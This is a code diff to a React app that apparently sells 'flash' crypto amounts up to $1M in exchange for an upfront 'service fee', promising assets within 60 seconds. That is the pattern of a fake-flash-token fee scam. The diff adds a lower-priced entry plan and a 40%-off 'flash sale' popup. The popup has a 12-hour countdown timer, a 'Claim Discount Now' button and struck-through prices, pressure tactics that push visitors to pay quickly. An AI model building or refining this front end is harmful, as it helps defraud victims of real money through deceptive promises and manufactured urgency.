@@ -27,17 +27,27 @@ import {
 
 // --- Constants ---
 
+const DISCOUNT_EXPIRY = new Date('2026-03-11T11:50:51Z').getTime();
+
 const PLANS = [
-  { id: 'p1', flash: 3000, fee: 50 },
-  { id: 'p2', flash: 6000, fee: 85 },
-  { id: 'p3', flash: 10000, fee: 140 },
-  { id: 'p4', flash: 25000, fee: 320 },
-  { id: 'p5', flash: 50000, fee: 600 },
-  { id: 'p6', flash: 100000, fee: 1100 },
-  { id: 'p7', flash: 250000, fee: 2500 },
-  { id: 'p8', flash: 500000, fee: 4500 },
-  { id: 'p9', flash: 1000000, fee: 8000 },
+  { id: 'p1', flash: 1500, fee: 30 },
+  { id: 'p2', flash: 3000, fee: 50 },
+  { id: 'p3', flash: 6000, fee: 85 },
+  { id: 'p4', flash: 10000, fee: 140 },
+  { id: 'p5', flash: 25000, fee: 320 },
+  { id: 'p6', flash: 50000, fee: 600 },
+  { id: 'p7', flash: 100000, fee: 1100 },
+  { id: 'p8', flash: 250000, fee: 2500 },
+  { id: 'p9', flash: 500000, fee: 4500 },
+  { id: 'p10', flash: 1000000, fee: 8000 },
 ];
+
+const getEffectiveFee = (fee: number, isDiscountActive: boolean) => {
+  if (isDiscountActive) {
+    return Math.round(fee * 0.6); // 40% discount
+  }
+  return fee;
+};
 
 const PAYMENT_METHODS = [
   { 
@@ -112,6 +122,73 @@ const TelegramPopup = ({ onClose }: { onClose: () => void }) => {
         </div>
       </div>
     </motion.div>
+  );
+};
+
+const DiscountPopup = ({ onClose }: { onClose: () => void }) => {
+  const [timeLeft, setTimeLeft] = useState('');
+
+  useEffect(() => {
+    const updateTimer = () => {
+      const now = Date.now();
+      const diff = DISCOUNT_EXPIRY - now;
+      if (diff <= 0) {
+        onClose();
+        return;
+      }
+      const hours = Math.floor(diff / (1000 * 60 * 60));
+      const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+      const seconds = Math.floor((diff % (1000 * 60)) / 1000);
+      setTimeLeft(`${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`);
+    };
+
+    updateTimer();
+    const interval = setInterval(updateTimer, 1000);
+    return () => clearInterval(interval);
+  }, [onClose]);
+
+  return (
+    <div className="fixed inset-0 z-[200] flex items-center justify-center p-4">
+      <motion.div 
+        initial={{ opacity: 0 }}
+        animate={{ opacity: 1 }}
+        exit={{ opacity: 0 }}
+        onClick={onClose}
+        className="absolute inset-0 bg-black/90 backdrop-blur-md"
+      />
+      <motion.div 
+        initial={{ opacity: 0, scale: 0.8, rotate: -5 }}
+        animate={{ opacity: 1, scale: 1, rotate: 0 }}
+        exit={{ opacity: 0, scale: 0.8, rotate: 5 }}
+        className="relative w-full max-w-md bg-[#FF3131] p-8 rounded-[2rem] text-black text-center space-y-6 shadow-[0_0_100px_rgba(255,49,49,0.5)]"
+      >
+        <div className="absolute -top-10 left-1/2 -translate-x-1/2 w-20 h-20 bg-black rounded-full flex items-center justify-center border-4 border-[#FF3131] animate-bounce-subtle">
+          <Zap className="w-10 h-10 text-[#FF3131] fill-[#FF3131]" />
+        </div>
+        
+        <div className="space-y-2 pt-4">
+          <h2 className="text-5xl font-black tracking-tighter leading-none uppercase italic">40% OFF</h2>
+          <p className="text-black font-black uppercase tracking-widest text-sm">Flash Sale Active</p>
+        </div>
+
+        <div className="p-6 bg-black/10 rounded-2xl space-y-2">
+          <p className="font-bold text-lg leading-tight uppercase">
+            All service fees reduced for the next 12 hours only!
+          </p>
+          <div className="flex items-center justify-center gap-2 font-mono text-xs font-black bg-black text-[#FF3131] py-2 rounded-lg">
+            <Clock className="w-4 h-4" />
+            ENDS IN: {timeLeft}
+          </div>
+        </div>
+
+        <button 
+          onClick={onClose}
+          className="w-full py-4 bg-black text-[#FF3131] rounded-xl font-black uppercase tracking-widest hover:scale-105 transition-transform"
+        >
+          Claim Discount Now
+        </button>
+      </motion.div>
+    </div>
   );
 };
 
@@ -223,7 +300,29 @@ export default function App() {
   const [showDeposit, setShowDeposit] = useState(false);
   const [showP2P, setShowP2P] = useState(false);
   const [showHistory, setShowHistory] = useState(false);
-  
+  const [showDiscountPopup, setShowDiscountPopup] = useState(false);
+  const [isDiscountActive, setIsDiscountActive] = useState(Date.now() < DISCOUNT_EXPIRY);
+
+  useEffect(() => {
+    const checkDiscount = () => {
+      const active = Date.now() < DISCOUNT_EXPIRY;
+      setIsDiscountActive(active);
+      if (!active) setShowDiscountPopup(false);
+    };
+
+    const interval = setInterval(checkDiscount, 1000);
+    
+    if (isDiscountActive) {
+      const timer = setTimeout(() => setShowDiscountPopup(true), 2000);
+      return () => {
+        clearInterval(interval);
+        clearTimeout(timer);
+      };
+    }
+    
+    return () => clearInterval(interval);
+  }, [isDiscountActive]);
+
   // Address fields
   const [bepAddress, setBepAddress] = useState('');
   const [ercAddress, setErcAddress] = useState('');
@@ -313,8 +412,9 @@ export default function App() {
   };
 
   const handlePurchase = () => {
-    if (selectedPlan && walletBalance >= selectedPlan.fee) {
-      setWalletBalance(prev => prev - selectedPlan.fee);
+    const fee = getEffectiveFee(selectedPlan?.fee || 0, isDiscountActive);
+    if (selectedPlan && walletBalance >= fee) {
+      setWalletBalance(prev => prev - fee);
       setStep('success');
       setInsufficientFunds(false);
     } else {
@@ -471,13 +571,16 @@ export default function App() {
                       <button
                         key={plan.id}
                         onClick={() => setSelectedPlan(plan)}
-                        className={`py-3 rounded-xl border transition-all font-bold text-sm ${
+                        className={`py-3 px-1 rounded-xl border transition-all font-bold flex flex-col items-center justify-center gap-1 ${
                           selectedPlan?.id === plan.id
                           ? 'bg-[#FF3131] text-black border-[#FF3131]'
                           : 'bg-white/5 border-white/10 text-white/60 hover:border-white/20'
                         }`}
                       >
-                        ${plan.flash >= 1000000 ? '1M' : plan.flash >= 1000 ? `${plan.flash/1000}K` : plan.flash}
+                        <span className="text-xs">${plan.flash >= 1000000 ? '1M' : plan.flash >= 1000 ? `${plan.flash/1000}K` : plan.flash}</span>
+                        <span className={`text-[8px] font-mono ${selectedPlan?.id === plan.id ? 'text-black/60' : 'text-[#FF3131]'}`}>
+                          Fee: ${getEffectiveFee(plan.fee, isDiscountActive)}
+                        </span>
                       </button>
                     ))}
                   </div>
@@ -626,6 +729,21 @@ export default function App() {
                     <p>TO RECEIVE YOUR ASSETS, SIMPLY PAY THE SERVICE FEE FROM YOUR SYSTEM WALLET.</p>
                     <p className="text-white/40 text-[10px]">YOUR FLASH ASSETS WILL ARRIVE IN YOUR WALLET IN LESS THAN 60 SECONDS AFTER CONFIRMATION.</p>
                   </div>
+
+                  <div className="flex items-center justify-between p-4 bg-white/5 rounded-xl border border-white/10">
+                    <span className="text-xs text-white/40 uppercase font-mono">Service Fee</span>
+                    <div className="text-right">
+                      {isDiscountActive && (
+                        <span className="text-[10px] text-[#FF3131] font-mono line-through opacity-50 mr-2">
+                          ${selectedPlan?.fee}
+                        </span>
+                      )}
+                      <span className="text-xl font-black text-[#FF3131]">
+                        ${getEffectiveFee(selectedPlan?.fee || 0, isDiscountActive)}
+                      </span>
+                    </div>
+                  </div>
+
                   {insufficientFunds && (
                     <div className="p-4 rounded-xl bg-red-500/10 border border-red-500/20 text-red-500 text-sm font-bold animate-pulse">
                       YOU HAVE NOT ENOUGH FUNDS TO RECEIVE FLASH. PLEASE TOP-UP YOUR WALLET.
@@ -674,6 +792,11 @@ export default function App() {
           )}
         </AnimatePresence>
       </main>
+
+      {/* Discount Popup */}
+      <AnimatePresence>
+        {showDiscountPopup && <DiscountPopup onClose={() => setShowDiscountPopup(false)} />}
+      </AnimatePresence>
 
       {/* Deposit Modal */}
       <AnimatePresence>
